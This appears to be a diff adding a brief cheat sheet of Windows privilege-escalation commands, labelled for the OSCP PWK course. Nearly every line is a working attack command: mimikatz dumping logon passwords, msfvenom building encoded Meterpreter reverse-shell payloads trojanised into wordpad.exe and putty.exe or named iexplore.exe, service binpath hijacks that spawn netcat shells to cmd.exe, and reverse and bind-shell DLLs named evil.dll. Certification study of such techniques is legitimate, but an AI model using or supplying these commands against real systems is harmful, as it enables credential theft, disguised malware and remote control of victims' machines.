@@ -1,0 +1,24 @@
+OSCP PWK privilege escalation commands
+
+execute -H -i -c -m -d calc.exe -f "c:\\Mcafee\\mimikatz.exe" -a ‘”sekurlsa::logonPasswords full” exit’
+
+msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -x wordpad.exe -k -f exe -o wordpad1.exe
+
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.101 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=192.168.2.7 LPORT=443 -f exe -o iexplore.exe
+
+sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
+
+sc config upnphost binpath= "C:\McAfee\iexplore.exe -e C:\WINDOWS\System32\cmd.exe"
+
+
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+Another tweak to the runas technique is to use a powershell one liner so the user gets a prompt with a known signed exe rather than an unknown yellow warning prompt.
+
+sc config upnphost binpath= "C:\McAfee\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\spoolsv.exe"
+
+msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D > /root/Desktop/evil.dll
+
+msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -f dll -o evil.dll
